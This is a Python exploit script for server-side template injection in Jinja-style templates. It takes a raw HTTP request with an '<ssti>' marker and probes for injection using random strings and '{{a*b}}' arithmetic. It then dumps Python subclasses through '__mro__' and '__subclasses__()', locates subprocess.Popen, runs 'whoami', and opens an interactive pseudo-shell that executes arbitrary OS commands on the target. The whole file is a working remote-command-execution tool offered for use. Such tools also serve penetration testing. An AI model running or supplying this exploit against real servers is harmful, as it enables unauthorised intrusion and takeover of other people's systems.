#!/usr/bin/env python3
import argparse
import socket
import urllib.parse
import random
import string
import html
import re


class HTTPRequest:
    def __init__(self, request):
        self.request = request
        lines = self.request.split('\n')
        for line in lines:
            if line.startswith('Host: '):
                host, port = line.split(' ')[1].split(':')
                self.host = host
                self.port = int(port)
                break

        self.request += '\r\n'
                
        print('[!] Requests will be sent to %s:%s' % (self.host, self.port))

    def make_request(self, replacement):
        request = self.request.replace('<ssti>',
                                       urllib.parse.quote(replacement))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        s.send(request.encode())
        response = b''
        while True:
            part = s.recv(4096)
            if part is None or part == b'':
                break
            response += part
        return html.unescape(response.decode('utf-8'))


def random_string(length=32):
    return ''.join([random.choice(string.ascii_letters)
                    for i in range(length)])
    

def check_ssti(request):
    test_string = random_string()
    res = request.make_request(test_string)
    if test_string not in res:
        print('[-] Test string is not shown. Sorry, but blind SSTI is not supported yet')
        return False

    found = True
    for i in range(3):
        a, b = random.randint(1, 200), random.randint(1, 200)
        c = a * b
        res = request.make_request('{{%s*%s}}' % (a, b))
        if str(c) not in res:
            found = False
            break
    
    if not found:
        print('[-] {{a*b}} test failed')
        return False

    return True


def dump_classes(request):
    res = request.make_request('aAa' + "{{ ''.__class__.__mro__[1].__subclasses__() }}" + 'aAa')
    data = res.split('aAa')[1]
    if len(data) == 0:
        return None

    return re.findall(r"<(?:class|enum) '([^']+)'>", data)

    
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-r', dest='request_file', help='file with raw HTTP request', required=True)

    request_file = parser.parse_args().request_file

    # No need to handle exception - python error explains enough
    with open(request_file) as r:
        base_request = HTTPRequest(r.read())

    # Check if SSTI exists
    if not check_ssti(base_request):
        print('[-] SSTI not found')
        exit(0)
        
    print('[+] SSTI found, trying to run os commands')

    print('[!] Dumping all used classes')
    dumped = dump_classes(base_request)
    if dumped is None:
        print('[-] Failed to dump classes')
        exit(0)
    
    print('[!] Looking up for subprocess.popen()')
    subprocess_index = -1
    for index, s in enumerate(dumped):
        if 'subprocess.popen' in s.lower():
            subprocess_index = index
            break
    
    if subprocess_index == -1:
        print('[-] subprocess.popen() not found')
        exit(0)
    print('[+] subprocess.popen() at %s' % subprocess_index)

    payload = "aAa{{''.__class__.mro()[1].__subclasses__()[%s]('%s',shell=True,stdout=-1).communicate()[0].strip()}}aAa" % (subprocess_index, 'whoami')

    res = base_request.make_request(payload)
    print('[!] whoami:', res.split('aAa')[1])
    print('[+] Pseudo-shell:')
    while True:
        command = input('$ ')
        payload = "aAa{{''.__class__.mro()[1].__subclasses__()[%s]('%s',shell=True,stdout=-1).communicate()[0].strip()}}aAa" % (subprocess_index, command)
        res = base_request.make_request(payload)
        print(res.split('aAa')[1][2:-1].replace('\\n', '\n'))
        
        
